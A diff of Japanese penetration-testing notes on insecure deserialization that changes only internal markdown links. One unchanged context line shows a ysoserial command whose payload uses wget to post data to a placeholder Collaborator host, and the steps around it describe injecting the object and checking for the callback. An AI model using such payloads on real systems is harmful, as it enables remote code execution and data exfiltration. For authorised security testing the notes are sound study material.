@@ -1,6 +1,6 @@
-- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#Java)
-- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#PHP)
-- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#Ruby)
+- [⚡️Insecure deserialization](#Java)
+- [⚡️Insecure deserialization](#PHP)
+- [⚡️Insecure deserialization](#Ruby)
 
 ---
 ## Java
@@ -46,7 +46,7 @@ java -jar ysoserial-all.jar [payload] 'wget https://COLLABORATOR_DOMAIN --post-f
 ```
 - (`-w 0`: base64のオプション。改行を注入しないようにする)
 
-2. 生成されたオブジェクトを、[⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#準備)で明らかにしたエンコーディング方式に合わせて必要であればURLエンコードし(ctrl + U)、元のオブジェクトを上書きしてリクエストする
+2. 生成されたオブジェクトを、[⚡️Insecure deserialization](#準備)で明らかにしたエンコーディング方式に合わせて必要であればURLエンコードし(ctrl + U)、元のオブジェクトを上書きしてリクエストする
 3. Collaboratorを確認する
 
 ---
